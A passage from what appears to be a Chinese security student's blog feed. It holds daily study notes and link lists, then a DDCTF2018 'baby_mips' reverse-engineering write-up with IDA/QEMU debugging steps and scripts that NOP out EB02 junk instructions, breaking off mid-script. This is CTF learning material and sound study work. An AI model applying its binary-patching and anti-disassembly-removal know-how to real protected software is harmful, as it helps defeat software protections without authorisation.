title="2018.5.25-27"></a>2018.5.25-27</h3><p>这两天在大佬的带领下参加了川渝赛区的西普杯信息安全铁人三项赛<br>赛题分为数据赛，个人赛和企业赛<br>数据赛为数据流量分析，企业赛为渗透真实企业环境都算是web吧应该<br>个人赛是pwn！pwn！pwn！<br>于是盯了一天的pwn1，是道rop的题，pwn师傅肯定两分钟就做出来了。。作为re菜鸡只能现学现卖，先逆了遍流程(反正也不会pwn)，然后照着网上的资料，用ROPgadget( <a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="noopener">https://github.com/JonathanSalwan/ROPgadget</a> )生成了rop利用链，然后copy一个exp，改一改，运行。最后因为经验不足，没有找到真正的溢出长度，于是就很遗憾了(还是因为太菜</p><p>这次比赛给我感触很大，在实际的环境当中要懂的不仅仅是软件自身的保护，还应该了解网络以及软件对用户的保障。在信息安全竞赛中，也应该拓宽自己的知识面，才能灵活应对。</p><p>就写这么多吧，还是挺开心的</p><hr><h3 id="2018-5-24"><a href="#2018-5-24" class="headerlink" title="2018.5.24"></a>2018.5.24</h3><p>Miasm的博客，研究<strong>动态符号执行</strong><br><a href="http://www.miasm.re/blog/index.html" target="_blank" rel="noopener">http://www.miasm.re/blog/index.html</a></p><p><strong>The Legend of Random的系列教程</strong><br><a href="https://legend.octopuslabs.io/index.html" target="_blank" rel="noopener">https://legend.octopuslabs.io/index.html</a></p><hr><h3 id="2018-5-23"><a href="#2018-5-23" class="headerlink" title="2018.5.23"></a>2018.5.23</h3><p>今天做完了那天的题，写了wp</p><p>Dwarf Fortress真的很有意思，找到一个很易懂的教程 <a href="https://df-walkthrough.readthedocs.io/en/latest/" target="_blank" rel="noopener">https://df-walkthrough.readthedocs.io/en/latest/</a></p><p><strong>理解与分析 ELF 二进制文件格式</strong><br> <a href="https://linux-audit.com/elf-binaries-on-linux-understanding-and-analysis/" target="_blank" rel="noopener">https://linux-audit.com/elf-binaries-on-linux-understanding-and-analysis/</a></p><p><strong>使用 IDA Pro 和 x64dbg 逆向分析 Gootkit 恶意软件</strong><br><a href="https://www.youtube.com/watch?v=242Tn0IL2jE" target="_blank" rel="noopener">https://www.youtube.com/watch?v=242Tn0IL2jE</a></p><hr><h3 id="2018-5-22"><a href="#2018-5-22" class="headerlink" title="2018.5.22"></a>2018.5.22</h3><p>看到一个<strong>IDA快捷键的总结</strong> <a href="https://github.com/bt3gl/My-Gray-Hacker-Resources/blob/master/Reverse_Engineering/IDA/IDA_Pro_Shortcuts.pdf" target="_blank" rel="noopener">https://github.com/bt3gl/My-Gray-Hacker-Resources/blob/master/Reverse_Engineering/IDA/IDA_Pro_Shortcuts.pdf</a></p><p><strong>GDB基本命令</strong><br><a href="https://github.com/bt3gl/My-Gray-Hacker-Resources/blob/master/Reverse_Engineering/gdb/GDB%20Cheat%20Sheet.pdf" target="_blank" rel="noopener">https://github.com/bt3gl/My-Gray-Hacker-Resources/blob/master/Reverse_Engineering/gdb/GDB%20Cheat%20Sheet.pdf</a></p><p><strong>CTF知识合集</strong><br><a href="https://github.com/zardus/ctf-tools" target="_blank" rel="noopener">https://github.com/zardus/ctf-tools</a></p><p>一个著名的游戏<strong>Dwarf Fortress</strong><br><a href="http://www.bay12games.com/dwarves/index.html" target="_blank" rel="noopener">http://www.bay12games.com/dwarves/index.html</a></p><hr><h3 id="2018-5-21"><a href="#2018-5-21" class="headerlink" title="2018.5.21"></a>2018.5.21</h3><p>早上五点被热醒。。。学校半夜断电，开不了空调，差评<br>开电脑继续看昨天的题，进展很大，在让栈指针平衡后，IDA可以F5了，瞬间很好理解，但是算法太复杂了，学习了gdb动态调试，的确是非常强大的工具。</p><p>还是没做出来，很难受<br>晚上看了一个很棒的CTF总结 <a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/" target="_blank" rel="noopener">https://firmianay.gitbooks.io/ctf-all-in-one/content/</a></p><hr><h3 id="2018-5-20"><a href="#2018-5-20" class="headerlink" title="2018.5.20"></a>2018.5.20</h3><p>本来准备“好好学英语”，结果实验室来了场练习赛<br>逆向是一道Linux的，压缩包里给了一个二进制文件和一个名为“out”的文件，里面是几行十六进制之类的，总感觉这个题给的形式在哪儿见过，但是想不起来了。F5不能分析，看看图形化分析，算法很复杂，想用angr，但存在alarm函数，angr脚本运行不了，毫无思路，感觉最近很浮躁</p><p>晚上边看英语边看RNG。。。</p><hr><h3 id="2018-5-19"><a href="#2018-5-19" class="headerlink" title="2018.5.19"></a>2018.5.19</h3><p>一整天又是实验课又是ACM比赛，晚上九点多才好好吃了顿饭。<br>打ACM太菜了，没算法没数据没脑洞，有几道题好不容易输出符合，还不给AC。。。还是滚回来看逆向好了(虽说也很菜)</p><hr><h3 id="2018-5-18"><a href="#2018-5-18" class="headerlink" title="2018.5.18"></a>2018.5.18</h3><p>今天就把前几天的也记上吧</p><h4 id="1-打造个性超赞博客Hexo-NexT-GithubPages的超深度优化"><a href="#1-打造个性超赞博客Hexo-NexT-GithubPages的超深度优化" class="headerlink" title="1.打造个性超赞博客Hexo+NexT+GithubPages的超深度优化"></a>1.打造个性超赞博客Hexo+NexT+GithubPages的超深度优化</h4><p>这篇文章加里面的链接可以说是优化博客非常全的一篇文章了</p><blockquote><p><a href="https://reuixiy.github.io/technology/computer/computer-aided-art/2017/06/09/hexo-next-optimization.html" target="_blank" rel="noopener">https://reuixiy.github.io/technology/computer/computer-aided-art/2017/06/09/hexo-next-optimization.html</a></p></blockquote><h4 id="2-一个假装是死循环的有限循环"><a href="#2-一个假装是死循环的有限循环" class="headerlink" title="2.一个假装是死循环的有限循环"></a>2.一个假装是死循环的有限循环</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for(int i=1; i&lt;0; i++)</span><br><span class="line">&#123;</span><br><span class="line">    cout &lt;&lt; &quot;我不是死循环&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原理: 明天写。。。</p><h4 id="3-IDA-技巧-处理动态导入"><a href="#3-IDA-技巧-处理动态导入" class="headerlink" title="3.IDA 技巧-处理动态导入"></a>3.IDA 技巧-处理动态导入</h4><blockquote><p><a href="https://www.usualsuspect.re/article/ida-tricks-handling-dynamic-imports" target="_blank" rel="noopener">https://www.usualsuspect.re/article/ida-tricks-handling-dynamic-imports</a></p></blockquote><h4 id="4-逆向-Path-of-Exile-游戏系列"><a href="#4-逆向-Path-of-Exile-游戏系列" class="headerlink" title="4.逆向 Path of Exile 游戏系列"></a>4.逆向 Path of Exile 游戏系列</h4><blockquote><p>Part 1： <a href="http://tbinarii.blogspot.in/2018/05/reverse-engineering-path-of-exile.html" target="_blank" rel="noopener">http://tbinarii.blogspot.in/2018/05/reverse-engineering-path-of-exile.html</a><br>Part 2： <a href="http://tbinarii.blogspot.in/2018/05/reverse-engineering-path-of-exile_0.html" target="_blank" rel="noopener">http://tbinarii.blogspot.in/2018/05/reverse-engineering-path-of-exile_0.html</a><br>Part 3：<a href="http://tbinarii.blogspot.in/2018/05/reverse-engineering-path-of-exile-game.html" target="_blank" rel="noopener">http://tbinarii.blogspot.in/2018/05/reverse-engineering-path-of-exile-game.html</a></p></blockquote><h4 id="5-Adobe-Acrobat-Reader-DC-远程代码执行漏洞详情披露-CVE-2018-4996、CVE-2018-4947"><a href="#5-Adobe-Acrobat-Reader-DC-远程代码执行漏洞详情披露-CVE-2018-4996、CVE-2018-4947" class="headerlink" title="5.Adobe Acrobat Reader DC 远程代码执行漏洞详情披露(CVE-2018-4996、CVE-2018-4947)"></a>5.Adobe Acrobat Reader DC 远程代码执行漏洞详情披露(CVE-2018-4996、CVE-2018-4947)</h4><blockquote><p><a href="https://blog.talosintelligence.com/2018/05/multiple-acrobat-reader-vulns.html" target="_blank" rel="noopener">https://blog.talosintelligence.com/2018/05/multiple-acrobat-reader-vulns.html</a></p></blockquote><p>From <a href="https://kabeor.github.io/Top/">https://kabeor.github.io/Top/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;写在前面的话&quot;&gt;&lt;a href=&quot;#写在前面的话&quot; class=&quot;headerlink&quot; title=&quot;写在前面的话&quot;&gt;&lt;/a&gt;写在前面的话&lt;/h1&gt;&lt;p&gt;一直想要写这个了，每天记录，每周上传吧，把每天有意思的事物写下来&lt;/p&gt;
&lt;h2 id=&quot;Issue&quot;&gt;&lt;a
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>DDCTF2018 Reverse writeup(1) baby_mips</title>
    <link href="https://kabeor.github.io/DDCTF2018%20Reverse%20writeup(1)%20baby_mips/"/>
    <id>https://kabeor.github.io/DDCTF2018 Reverse writeup(1) baby_mips/</id>
    <published>2018-05-15T04:07:53.287Z</published>
    <updated>2018-07-16T09:23:21.921Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DDCTF2018-Reverse-writeup"><a href="#DDCTF2018-Reverse-writeup" class="headerlink" title="DDCTF2018 Reverse writeup"></a>DDCTF2018 Reverse writeup</h1><h2 id="baby-mips"><a href="#baby-mips" class="headerlink" title="baby_mips"></a>baby_mips</h2><p>花了一天，终于写完了</p><p>这是一道mips指令集的逆向题。<br>关于mips架构  <a href="https://zh.wikipedia.org/wiki/MIPS%E6%9E%B6%E6%A7%8B" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/MIPS%E6%9E%B6%E6%A7%8B</a></p><h3 id="初步尝试"><a href="#初步尝试" class="headerlink" title="初步尝试"></a>初步尝试</h3><p>在ubuntu运行<br><code>./baby_mips</code></p><p>会让输入16个值,然后提示非法指令<br><img src="https://i.loli.net/2018/07/16/5b4c615ee4801.jpg" alt="mark"></p><p>在IDA中分析一下</p><h3 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h3><p>进入IDA首先就是搜索字符串<br>显而易见<br><img src="https://i.loli.net/2018/07/16/5b4c615f0bf91.jpg" alt="mark"><br>图形化分析这里<br><img src="https://i.loli.net/2018/07/16/5b4c615f2d212.jpg" alt="mark"><br>可以看出是一个简单的条件判断</p><p>如果你以为F5看算法写脚本就结束，那就too native了</p><h3 id="使用qemu模拟器动态调试"><a href="#使用qemu模拟器动态调试" class="headerlink" title="使用qemu模拟器动态调试"></a>使用qemu模拟器动态调试</h3><p>baby_mips是MIPS指令集上的程序，IDA只能静态分析，不能debug。采取的方法是在linux机上安装qemu模拟器，利用qemu来运行MIPS指令程序。</p><p>因此，首先当然是在ubuntu上安装qemu模拟器了<br><code>sudo apt-get install qemu</code><br>就可以了</p><p>qemu可以模拟很多指令集<br><img src="https://i.loli.net/2018/07/16/5b4c615f4e755.jpg" alt="mark"></p><p><strong>关于用法，最简单的</strong><br><code>qemu-你需要的指令集 文件名</code></p><p><strong>如果要利用IDA调试(IDA远程调试)</strong><br><code>qemu-你需要的指令集 -g 端口 文件名</code><br>原理：qemu -g port指令开启一个gdbserver。port另一端可以由IDA或gdb连接调试。</p><p>运行以后在IDA<br><img src="https://i.loli.net/2018/07/16/5b4c615f7382c.jpg" alt="mark"><br>选GDB调试，点左边绿色的RUN<br><img src="https://i.loli.net/2018/07/16/5b4c615f96143.jpg" alt="mark"><br>确定<br><img src="https://i.loli.net/2018/07/16/5b4c615fa8f78.jpg" alt="mark"><br>确定<br><img src="https://i.loli.net/2018/07/16/5b4c615fbcf6a.jpg" alt="mark"></p><p>下面我们需要输入的是Hostname和Port，如果你是在运行qemu的系统里运行IDA，Hostname就填127.0.0.1，要是别的系统，比如你用的是虚拟机，就填运行qume的系统的IP,Port就填刚刚qemu里设置好的就行。(这些是常识了)</p><p>然后确认IDA就可以动态调试了</p><p>经过尝试，这里的baby_mips是mips小字端程序，所以我们运行指令<br><code>qemu-mipsel -g 6666 baby_mips</code><br>然后IDA点确定<br><img src="https://i.loli.net/2018/07/16/5b4c615fd14a2.jpg" alt="mark"><br><img src="https://i.loli.net/2018/07/16/5b4c617b00159.jpg" alt="mark"><br>成功了</p><p>我们运行程序，输入16个数，弹出一个错<br><img src="https://i.loli.net/2018/07/16/5b4c617b26015.jpg" alt="mark"><br><img src="https://i.loli.net/2018/07/16/5b4c617b4755e.jpg" alt="mark"></p><p>程序停在了00400430，并且这里的指令是以EB02开头的</p><p>往下翻翻，发现非常多的EB02，然后下面的指令就不被识别了</p><p><img src="https://i.loli.net/2018/07/16/5b4c617b69646.jpg" alt="mark"></p><p>IDA有一个强大的插件</p><blockquote><p>keypatch —–<a href="http://www.keystone-engine.org/keypatch/" target="_blank" rel="noopener">http://www.keystone-engine.org/keypatch/</a></p></blockquote><p>可以用这个插件把第一个EB02 NOP ，然后运行的话会发现又在下一个EB02报错，所以应该就是EB02的问题了</p><p>至于原理，参阅了很多篇wp，大概就是</p><blockquote><p>查找lwc1指令的含义，发现是与协处理器相关的指令。通过对后面的代码块进行分析发现，后面并没有用到$f29和$t1寄存器的内容</p><p>指令的头两个字节为 \xEB\x02 ，且在x86指令集中 \xEB 为跳转指令。</p><p>把操作码反汇编成汇编代码后发现第一条指令是 jmp 0x4 ，刚好MIPS指令集每条指令大小为4字节。</p><p>猜测程序让我们遇到这个指令就跳转四字节</p></blockquote><p>于是现在的思路就是将所有EB02开头的指令nop</p><p>由于MIPS指令是定长的，均为4个字节。因此，可以在选定的代码块中，将所有以EB 02开始的4字节数据全部替换成00 00 00 00，在MIPS指令中，nop对应的机器码为00 00 00 00</p><p>需要固定监测指令的头部，是因为可能会误清除掉正常指令</p><h3 id="使用脚本去除EB02指令"><a href="#使用脚本去除EB02指令" class="headerlink" title="使用脚本去除EB02指令"></a>使用脚本去除EB02指令</h3><p>下面是各位大佬写的IDC或IDPython脚本，功能都是去除EB02指令</p><hr><p>来自‘奈沙夜影’</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;idc.idc&gt;</span><br><span class="line"></span><br><span class="line">static matchBytes(StartAddr, Match) </span><br><span class="line">&#123; </span><br><span class="line">    auto Len, i, PatSub, SrcSub; </span><br><span class="line">    Len = strlen(Match);</span><br><span class="line"></span><br><span class="line">    while (i &lt; Len) </span><br><span class="line">    &#123; </span><br><span class="line">       PatSub = substr(Match, i, i+1); </span><br><span class="line">       SrcSub = form(&quot;%02X&quot;, Byte(StartAddr)); </span><br><span class="line">       SrcSub = substr(SrcSub, i % 2, (i % 2) + 1); </span><br><span class="line"></span><br><span class="line">       if (PatSub != &quot;?&quot; &amp;&amp; PatSub != SrcSub) </span><br><span class="line">       &#123; </span><br><span class="line">        return 0; </span><br><span class="line">       &#125; </span><br><span class="line"></span><br><span class="line">       if (i % 2 == 1) </span><br><span class="line">       &#123; </span><br><span class="line">        StartAddr++; </span><br><span class="line">       &#125; </span><br><span class="line">       i++; </span><br><span class="line">    &#125;</span><br><span class="line">    return 1; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">static main() </span><br><span class="line">&#123; </span><br><span class="line">   auto StartVa, SavedStartVa, StopVa, Size, i, j;</span><br><span class="line"></span><br><span class="line">    StartVa = 0x400420; </span><br><span class="line">    StopVa = 0x403233;</span><br><span class="line"></span><br><span class="line">    Size = StopVa - StartVa; </span><br><span class="line">    SavedStartVa = StartVa;</span><br><span class="line"></span><br><span class="line">    for (i = 0; i &lt; Size/4; i++) </span><br><span class="line">    &#123; </span><br><span class="line">       if (matchBytes(StartVa, &quot;EB02????&quot;)) </span><br><span class="line">       &#123; </span><br><span class="line">            Message(&quot;Find%x:%02x%02x%02x%02x\n&quot;, StartVa,Byte(StartVa),Byte(StartVa+1),Byte(StartVa+2),Byte(StartVa+3));</span><br><span class="line">            for (j = 0; j &lt; 4; j++) </span><br><span class="line">            &#123; </span><br><span class="line"></span><br><span class="line">                 PatchByte(StartVa, 0x00); </span><br><span class="line">                 MakeCode(StartVa); </span><br><span class="line">                 StartVa++; </span><br><span class="line">            &#125; </span><br><span class="line">       &#125; </span><br><span class="line">        else</span><br><span class="line">            StartVa=StartVa+4; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    AnalyzeArea(SavedStartVa, StopVa); </span><br><span class="line">    Message(&quot;Clear eb02 Opcode Ok &quot;); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>来自‘逢魔安全实验室’</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">f = open(&quot;baby_mips&quot;, &quot;rb&quot;)</span><br><span class="line">content = f.read()</span><br><span class="line">content = list(content)</span><br><span class="line">for x in range(0, len(content)):</span><br><span class="line">    if content[x] == &quot;\xeb&quot; and content[x+1] == &quot;\x02&quot; and (x%4==0):</span><br><span class="line">        content[x] = &quot;\x00&quot;</span><br><span class="line">        content[x+1] = &quot;\x00&quot;</span><br><span class="line">        content[x+2] = &quot;\x00&quot;</span><br><span class="line">        content[x+3] = &quot;\x00&quot;</span><br><span class="line">content = &quot;&quot;.join(content)</span><br><span class="line">p = open(&quot;patch&quot;, &quot;wb&quot;)</span><br><span class="line">p.write(content)</span><br></pre></td></tr></table></figure><hr><p>来自‘cq674350529’</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import idautils</span><br><span class="line">import idc</span><br><span class="line">import idaapi</span><br><span class="line"></span><br><span class="line">start_addr = 0x400420</span><br><span class="line">end_addr = 0x403234</span><br><span class="line">while start_addr &lt;= end_addr:</span><br><span class="line">    if Byte(start_addr) == 0xeb and Byte(start_addr +1) == 0x2:</span><br><span class="line">        PatchByte(start_addr,0x00)</span><br><span class="line">        PatchByte(start_addr+1,0x00)</span><br><span class="line">        PatchByte(start_addr+2,0x00)</span><br><span class="line">        PatchByte(start_addr+3,0x00)</span><br><span class="line">    start_addr += 4</span><br></pre></td></tr></table></figure><hr><p>选择上述其中一个脚本，在桌面保存成一个.py或.idc文件<br>选择File-&gt;Script file或Script command</p><p><img src="https://i.loli.net/2018/07/16/5b4c617b7d80a.jpg" alt="mark"></p><p>然后import导入或直接写也可以，然后RUN<br><img src="https://i.loli.net/2018/07/16/5b4c617b906bc.jpg" alt="mark"></p><p>关闭这个窗口，会有一个提示是否保存修改，点击Yes，这时桌面会生成一个patch<br><img src="https://i.loli.net/2018/07/16/5b4c617ba424b.jpg" alt="mark"></p><p>IDA载入这个patch，可以发现在ubuntu下的IDA里指令都可以被识别，而且可以运行，我在win10运行的IDA会有几个小段不能识别，需要手动改为指令，将0x400420处的代码转换成函数</p><h3 id="将数据转为代码和函数"><a href="#将数据转为代码和函数" class="headerlink" title="将数据转为代码和函数"></a>将数据转为代码和函数</h3><p>首先往下看看，有几段没有识别的<br><img src="https://i.loli.net/2018/07/16/5b4c617bb9aa6.jpg" alt="mark"><br>把它们全部选中(00401A58-00401F28)，右键,选择Analyze selected area或按C，<br><img src="https://i.loli.net/2018/07/16/5b4c617bce1a2.jpg" alt="mark"><br>选Analyze，然后Yes，然后就会变成代码<br><img src="https://i.loli.net/2018/07/16/5b4c618e6b9a9.jpg" alt="mark"><br>当然这还没完，函数头部00400420没有变量声明，识别出来的肯定是错误的函数，因此在00400420右键，选择Create function<br><img src="https://i.loli.net/2018/07/16/5b4c618e978db.jpg" alt="mark"><br>就可以了<br>然后图形化分析就像下面那样</p><p><strong>记得保存修改，路径Edit-&gt;Patch program-&gt;Apply patches input file</strong></p><blockquote><p><strong>标准转换方式</strong></p><p>1.<em>函数和数据互换</em></p><p>在重新格式化之前，首先必须删除其当前的格式（代码或数据）。右击你希望取消定义的项目，在结果上下文菜单中选择Undefine（也可使用Edit▶Undefine命令或热键U），即可取消函数、代码或数据的定义</p><p>转换成code后，此时不能使用图形view<br>创建函数（Edit—&gt;Functions—&gt;Create Function….）就可以了</p><p>2.<em>代码和数据转换</em></p><p>通过Edit▶Data和热键D来完成,之后使用Undefine<br>之后使用code指令</p></blockquote><h3 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h3><h4 id="1-反编译器分析"><a href="#1-反编译器分析" class="headerlink" title="1.反编译器分析"></a>1.反编译器分析</h4><p>用图形化分析sub_400420这个函数<br><img src="https://i.loli.net/2018/07/16/5b4c618eac743.jpg" alt="mark"><br>一共十六个条件，必须每条都得满足才行</p><p>IDA的F5不能用，我们需要能够分析MIPS的反编译器<br>· <strong>Retdec</strong>     <a href="https://github.com/avast-tl/retdec" target="_blank" rel="noopener">https://github.com/avast-tl/retdec</a><br>· <strong>JEB-MIPS</strong>   <a href="https://www.pnfsoftware.com/jeb/demomips" target="_blank" rel="noopener">https://www.pnfsoftware.com/jeb/demomips</a></p><p>下面是三种找出算法的方法</p><h5 id="1-Retdec"><a href="#1-Retdec" class="headerlink" title="1.Retdec"></a>1.Retdec</h5><p>RetDec 是一个可重定向的机器码反编译器，它基于 LLVM，支持各种体系结构、操作系统和文件格式：<br>支持的文件格式：ELF，PE，Mach-O，COFF，AR（存档），Intel HEX 和原始机器码。<br>支持的体系结构（仅限 32 位）：Intel x86，ARM，MIPS，PIC32 和 PowerPC。</p><p>安装和使用方法GitHub上都写了<br>或者这里有一个很好的简易介绍  <a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/5.11.1_retdec.html" target="_blank" rel="noopener">https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/5.11.1_retdec.html</a></p><p>我在win10安装之后，把patch放到了D盘根目录，Retdec文件夹也是，然后在cmd中执行<br><code>D:\retdec\bin\decompile.sh D:\patch</code><br>等待分析(因为我装了Git，就自动调用Git bash执行了，其他情况还没试过)<br>结束后D盘生成下面几个文件<br><img src="https://i.loli.net/2018/07/16/5b4c618ec9bd3.jpg" alt="mark"><br>打开patch.c，看sub_400420<br>我的不知道出了什么问题，分析不了，直接return 1。。。感觉应该是把函数分解了</p><p><img src="https://i.loli.net/2018/07/16/5b4c618ee2755.jpg" alt="mark"></p><p>借用一下‘niuwuwu’的图<br><img src="https://i.loli.net/2018/07/16/5b4c618f05c61.jpg" alt="mark"></p><p>是16个方程求解，解方程下面说，接下来用JEB反编译</p><h5 id="2-JEB-MIPS"><a href="#2-JEB-MIPS" class="headerlink" title="2.JEB-MIPS"></a>2.JEB-MIPS</h5><p>先到官网下载试用版的JEB，试用版功能是完整版的百分之九十，所以其实足够学习用了(国外友人客服也非常专业且友好)</p><p>解压后有三个运行脚本，分别是Windows，Linux和Mac OS的，我为了方便就装Ubuntu了</p><p><strong>不管是哪个系统，我们都需要JAVA8的环境</strong></p><p>Ubuntu安装JAVA8<br><code>sudo apt-get install openjdk-8-jdk</code><br>查看java版本，看看是否安装成功<br><code>java -version</code></p><p>成功后运行脚本，就打开主程序了，导入patch程序，找到00400420<br><img src="https://i.loli.net/2018/07/16/5b4c618f29f4e.jpg" alt="mark"><br>右键，Decompile<br><img src="https://i.loli.net/2018/07/16/5b4c618f4427c.jpg" alt="mark"><br>很长很长的算式，就是16个方程了</p><h4 id="2-手工分析清洗方程"><a href="#2-手工分析清洗方程" class="headerlink" title="2.手工分析清洗方程"></a>2.手工分析清洗方程</h4><p>(来自‘奈沙夜影’)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f = open(&quot;code.txt&quot;, &quot;r&quot;)</span><br><span class="line">flower = [&quot;slti&quot;, &quot;sdc1&quot;]</span><br><span class="line">a0 = 0x76ff270</span><br><span class="line">v0 = 0xd0000</span><br><span class="line">v1 = 8</span><br><span class="line">fp = [0 for i in range(0x500)]</span><br><span class="line">table = [0x0, 0x42d1f0, 0x0, 0x42d1f0,</span><br><span class="line">0xa, 0xa, 0x0, 0x9,</span><br><span class="line">0x4250bc, 0x9, 0x426630, 0x42d1f0,</span><br><span class="line">0x40a3ec, 0x37343431, 0x363434, 0x0,</span><br><span class="line">0x0, 0x42d1f0, 0x0, 0x4250bc,</span><br><span class="line">0x0, 0x0, 0x425060, 0x42d1f0,</span><br><span class="line">0x403ad0, 0x0, 0x0, 0x1000,</span><br><span class="line">0x425088, 0x76fff184, 0x412fcd, 0x1,</span><br><span class="line">0x410570, 0x425190, 0x40ca48, 0x0,</span><br><span class="line">0x0, 0x42d1f0, 0x0, 0x42d1f0,</span><br><span class="line">0x425088, 0xffffffff, 0x4106c4, 0xffffffff,</span><br><span class="line">0x76fff184, 0x412fcd, 0x1, 0x42d1f0,</span><br><span class="line">0x0, 0x425088, 0x40ccac, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x42d1f0,</span><br><span class="line">0x0, 0x425190, 0x76ffeef8, 0x425190,</span><br><span class="line">0x10, 0x425088, 0x40baac, 0x42d1f0,</span><br><span class="line">0x412fcd, 0x1, 0x425088, 0x40baac,</span><br><span class="line">0x76fff184, 0x412fce, 0x40b684, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x42d1f0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x42d1f0, 0x0, 0x42d1f0,</span><br><span class="line">0x0, 0x4250bc, 0x413081, 0x9,</span><br><span class="line">0x403f24, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x42d1f0,</span><br><span class="line">0x0, 0x413078, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0xd0000, 0xf1f4,</span><br><span class="line">0xcf8, 0xf5f1, 0x7883, 0xe2c6,</span><br><span class="line">0x67, 0xeccc, 0xc630, 0xba2e,</span><br><span class="line">0x6e41, 0x641d, 0x716d, 0x4505,</span><br><span class="line">0x76fff224, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0xfffffffe, 0x0,</span><br><span class="line">0x76fff2ac, 0x412fcd, 0x1, 0x0,</span><br><span class="line">0x6, 0x7fffffff, 0x1, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0xa, 0xa, 0x425088, 0x8,</span><br><span class="line">0x7ffffff8, 0x100, 0x413f38, 0x1,</span><br><span class="line">0x413f38, 0x0, 0x2, 0x76fff0f8,</span><br><span class="line">0x0, 0x0, 0x7fffffff, 0x76fff220,</span><br><span class="line">0x405050, 0x550001, 0x0, 0x425000,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x76fff220,</span><br><span class="line">0x404d84, 0x42d1f0, 0x0, 0x500,</span><br><span class="line">0x5, 0x42d1f0, 0xb3b, 0x76fff224,</span><br><span class="line">0x115, 0x1a131100, 0x76fff220, 0x76fff270,</span><br><span class="line">0x76fff2ac, 0xffbecf88, 0xa, 0x405880]</span><br><span class="line">j = 0</span><br><span class="line">functions = 0</span><br><span class="line">for i in range(0xb4, 0x410, 4):</span><br><span class="line">    fp[i] = table[j]</span><br><span class="line">    j += 1</span><br><span class="line">input = [int(str(i)*3, 16) for i in range(16)]</span><br><span class="line">try:</span><br><span class="line">    while(True):</span><br><span class="line">        code = f.readline()</span><br><span class="line">        if(code == &quot;&quot;):</span><br><span class="line">            print(&quot;finish&quot;)</span><br><span class="line">            break</span><br><span class="line">        if(code[:3] == &quot;loc&quot;):</span><br><span class="line">            # print(&quot;\n[s]:\t&quot; + code[:-1])</span><br><span class="line">            continue</span><br><span class="line">        if(code.find(&quot;nop&quot;)!=-1):</span><br><span class="line">            continue</span><br><span class="line">        code = code.split(&quot;$&quot;)</span><br><span class="line">        # print(code)</span><br><span class="line"></span><br><span class="line">        c = code[0].strip()</span><br><span class="line"></span><br><span class="line">        if(c==&quot;sw&quot;):</span><br><span class="line">            n1 = code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            n2 = 0x410 - int(&quot;0x&quot; + code[1].split(&quot;_&quot;)[1].split(&quot;(&quot;)[0], 16)</span><br><span class="line">            code = (&quot;fp[&quot; + hex(n2) + &quot;] = &quot; + n1)</span><br><span class="line">        elif(c==&quot;li&quot;):</span><br><span class="line">            n1 = code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            n2 = code[1].split(&quot;,&quot;)[1].strip()</span><br><span class="line">            code = (n1 + &quot; = &quot; + n2)</span><br><span class="line">        elif(c==&quot;lw&quot;):</span><br><span class="line">            n1 = code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            if(&quot;&quot;.join(code).find(&quot;fp&quot;)!=-1):</span><br><span class="line">                n2 = 0x410 - int(&quot;0x&quot; + code[1].split(&quot;_&quot;)[1].split(&quot;(&quot;)[0], 16)</span><br><span class="line">                code = (n1 + &quot; = fp[&quot; + hex(n2) + &quot;]&quot;)</span><br><span class="line">                # print(&quot;# &quot; + hex(fp[n2]))</span><br><span class="line">                #输出方程</span><br><span class="line">                print(&quot;0x%x*&quot;%fp[n2],end=&apos;&apos;)</span><br><span class="line">            else:</span><br><span class="line">                # print(&quot;[c]:\t&quot; + &quot;&quot;.join(code)[:-1], &quot;v0=%x&quot;%v0)</span><br><span class="line">                n2 = ((v0) + int(code[1].split(&quot;,&quot;)[1].replace(&quot;(&quot;, &quot;&quot;)))//4</span><br><span class="line">                code = (n1 + &quot; = input[&quot; + str(n2) + &quot;]&quot;)</span><br><span class="line">                print(&quot;a[%d]&quot;%n2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                # print(code)</span><br><span class="line">                # print(hex(v0))</span><br><span class="line">                # break</span><br><span class="line">        elif(c==&quot;sll&quot;):</span><br><span class="line">            n1 = code[1].split(&quot;,&quot;)[0]</span><br><span 